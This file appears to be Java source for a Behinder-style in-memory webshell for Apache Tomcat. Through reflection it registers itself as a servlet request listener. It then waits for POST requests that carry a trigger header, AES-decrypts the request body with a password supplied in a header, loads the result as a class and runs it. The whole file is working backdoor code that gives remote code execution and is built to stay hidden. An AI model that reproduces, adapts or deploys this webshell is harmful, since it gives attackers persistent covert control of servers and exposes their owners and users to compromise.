package com.summersec.x;

import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.Response;
import org.apache.catalina.connector.ResponseFacade;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.http.Parameters;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.util.*;

public class BehinderListener extends ClassLoader implements ServletRequestListener {
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    public String cs = "UTF-8";
    public String Pwd = "eac9fa38330a7535";
    public String path = "/favicondemo.ico";
    String randomHeader = "default";

    public BehinderListener() {
    }

    public BehinderListener(ClassLoader z) {
    }

    public static String md5(String s) {
        String ret = null;

        try {
            MessageDigest m = MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = (new BigInteger(1, m.digest())).toString(16).substring(0, 16);
        } catch (Exception var3) {
        }

        return ret;
    }

    public boolean equals(Object obj) {
        this.parseObj(obj);
        this.Pwd = md5(this.request.getHeader("p"));
        this.randomHeader = this.request.getHeader("h");
        StringBuffer output = new StringBuffer();
        String tag_s = "->|";
        String tag_e = "|<-";

        try {
            this.response.setContentType("text/html");
            this.request.setCharacterEncoding(this.cs);
            this.response.setCharacterEncoding(this.cs);
            output.append(this.addListener());
        } catch (Exception var7) {
            output.append("error:" + var7.toString());
        }

        try {
            this.response.getWriter().print(tag_s + output.toString() + tag_e);
            this.response.getWriter().flush();
            this.response.getWriter().close();
        } catch (Exception var6) {
        }

        return true;
    }

    public void parseObj(Object obj) {
        if (obj.getClass().isArray()) {
            Object[] data = (Object[])((Object[])obj);
            this.request = (HttpServletRequest)data[0];
            this.response = (HttpServletResponse)data[1];
        } else {
            try {
                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
                this.request = (HttpServletRequest)clazz.getDeclaredMethod("getRequest").invoke(obj);
                this.response = (HttpServletResponse)clazz.getDeclaredMethod("getResponse").invoke(obj);
            } catch (Exception var8) {
                if (obj instanceof HttpServletRequest) {
                    this.request = (HttpServletRequest)obj;

                    try {
                        Field req = this.request.getClass().getDeclaredField("request");
                        req.setAccessible(true);
                        HttpServletRequest request2 = (HttpServletRequest)req.get(this.request);
                        Field resp = request2.getClass().getDeclaredField("response");
                        resp.setAccessible(true);
                        this.response = (HttpServletResponse)resp.get(request2);
                    } catch (Exception var7) {
                        try {
                            this.response = (HttpServletResponse)this.request.getClass().getDeclaredMethod("getResponse").invoke(obj);
                        } catch (Exception var6) {
                        }
                    }
                }
            }
        }

    }


    public String addListener() throws Exception {
        ServletContext servletContext = this.request.getServletContext();
        Field contextField = servletContext.getClass().getDeclaredField("context");
        contextField.setAccessible(true);
        ApplicationContext applicationContext = (ApplicationContext)contextField.get(servletContext);
        contextField = applicationContext.getClass().getDeclaredField("context");
        contextField.setAccessible(true);
        StandardContext standardContext = (StandardContext)contextField.get(applicationContext);

        standardContext.addApplicationEventListener(this);
        return "Success";
    }

    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[])((byte[])clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str));
        } catch (Exception var5) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke((Object)null);
            return (byte[])((byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, str));
        }
    }

    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {

    }

    public Class g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }

    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        try {
            // 入口
            if (request.getHeader(randomHeader).equals(randomHeader) && request.getMethod().equals("POST")) {
                Object lastRequest = request;
                Object lastResponse = response;

                // 解决包装类RequestWrapper的问题
                // 详细描述见 https://github.com/rebeyond/Behinder/issues/187
                if (!(lastRequest instanceof RequestFacade) && !(lastRequest instanceof Request)) {
                    Method getRequest = ServletRequestWrapper.class.getMethod("getRequest");
                    lastRequest = getRequest.invoke(request);
                    while (true) {
                        if (lastRequest instanceof RequestFacade) break;
                        lastRequest = getRequest.invoke(lastRequest);
                    }
                }
                // 解决包装类ResponseWrapper的问题
                if (!(lastResponse instanceof ResponseFacade) && !(lastResponse instanceof Response)) {
                    Method getResponse = ServletResponseWrapper.class.getMethod("getResponse");
                    lastResponse = getResponse.invoke(response);
                    while (true) {
                        if (lastResponse instanceof ResponseFacade) break;
                        lastResponse = getResponse.invoke(lastResponse);
                    }
                }

                if (request.getMethod().equals("POST")) {
                    // 创建pageContext
                    HashMap pageContext = new HashMap();
                    HttpSession session;
                    // lastRequest的session是没有被包装的session!!
                    try {
                        session = ((RequestFacade) lastRequest).getSession();
                    } catch (ClassCastException e) {
                        session = request.getSession();
                    }

                    pageContext.put("request", lastRequest);
                    pageContext.put("response", lastResponse);
                    pageContext.put("session", session);
                    // 这里判断payload是否为空 因为在springboot2.6.3测试时request.getReader().readLine()可以获取到而采取拼接的话为空字符串
                    String payload = request.getReader().readLine();
                    if (payload == null || payload.isEmpty()) {
                        payload = "";
                        // 拿到真实的Request对象而非门面模式的RequestFacade
                        Field field = lastRequest.getClass().getDeclaredField("request");
                        field.setAccessible(true);
                        Request realRequest = (Request) field.get(lastRequest);
                        // 从coyoteRequest中拼接body参数
                        Field coyoteRequestField = realRequest.getClass().getDeclaredField("coyoteRequest");
                        coyoteRequestField.setAccessible(true);
                        org.apache.coyote.Request coyoteRequest = (org.apache.coyote.Request) coyoteRequestField.get(realRequest);
                        Parameters parameters = coyoteRequest.getParameters();
                        Field paramHashValues = parameters.getClass().getDeclaredField("paramHashValues");
                        paramHashValues.setAccessible(true);
                        LinkedHashMap paramMap = (LinkedHashMap) paramHashValues.get(parameters);


                        Iterator<Map.Entry<String, ArrayList<String>>> iterator = paramMap.entrySet().iterator();
                        while (iterator.hasNext()) {
                            Map.Entry<String, ArrayList<String>> next = iterator.next();
                            String paramKey = next.getKey().replaceAll(" ", "+");
                            ArrayList<String> paramValueList = next.getValue();
                            if (paramValueList.size() == 0) {
                                payload = payload + paramKey;
                            } else {
                                payload = payload + paramKey + "=" + paramValueList.get(0);
                            }
                        }
                    }

                    // 冰蝎逻辑
                    String k = Pwd;
                    session.putValue("u", k);
                    Cipher c = Cipher.getInstance("AES");
                    c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                    (new BehinderListener(this.getClass().getClassLoader())).g(c.doFinal(this.base64Decode(payload))).newInstance().equals(pageContext);
                }
            }
        } catch (Exception e) {
        }
        return;
    }
}
